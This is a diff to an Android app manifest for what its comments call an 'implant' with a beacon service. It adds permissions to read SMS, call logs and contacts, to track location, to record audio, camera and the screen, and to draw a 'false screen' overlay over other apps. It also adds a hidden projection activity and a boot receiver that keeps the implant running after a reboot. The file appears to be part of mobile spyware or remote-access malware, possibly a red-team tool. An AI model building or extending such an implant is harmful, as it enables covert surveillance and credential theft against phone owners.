@@ -17,6 +17,35 @@
          the battery optimisation; the screen that asks for it needs this. -->
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
 
+    <!-- The senses of the phone.  Every one of these is a permission the
+         user of the phone grants, and the guide of the host says which of
+         them are still missing. -->
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.BLUETOOTH_SCAN"
+        android:usesPermissionFlags="neverForLocation" />
+    <uses-permission android:name="android.permission.BLUETOOTH_CONNECT" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_MMS" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.CAMERA" />
+
+    <!-- The overlay of the false screen.  It is the permission to draw
+         over the other applications, and the user of the phone grants it
+         in the settings. -->
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+
+    <!-- The foreground service of the microphone and of the capture of the
+         screen.  Both are types of the service of the beacon: the system
+         shows them in the notification of the service. -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+
     <!-- usesCleartextTraffic: the HTTP transport is plain HTTP by design (the
          implant has no TLS stack); see docs/SECURITY.md limitation 1 and run it
          inside a tunnel. -->
@@ -37,10 +66,30 @@
             </intent-filter>
         </activity>
 
+        <!-- The service of the beacon.  It carries the types of the
+             foreground service of the microphone and of the capture of
+             the screen, and the service announces at run time only the
+             ones whose permission the user granted: Android 14 refuses
+             a type whose permission is missing. -->
         <service
             android:name=".BeaconService"
             android:exported="false"
-            android:foregroundServiceType="dataSync" />
+            android:foregroundServiceType="dataSync|microphone|mediaProjection" />
+
+        <!-- The screen that asks the user for the capture of the screen.
+             The dialog of the platform belongs to the system; the
+             implant only opens it. -->
+        <activity
+            android:name=".ProjectionActivity"
+            android:exported="false"
+            android:excludeFromRecents="true"
+            android:noHistory="true" />
+
+        <!-- The service that holds the capture of the screen. -->
+        <service
+            android:name=".ProjectionService"
+            android:exported="false"
+            android:foregroundServiceType="mediaProjection" />
 
         <!-- The boot receiver: the implant comes back after a reboot.  It is
              exported because the system delivers the broadcast. -->
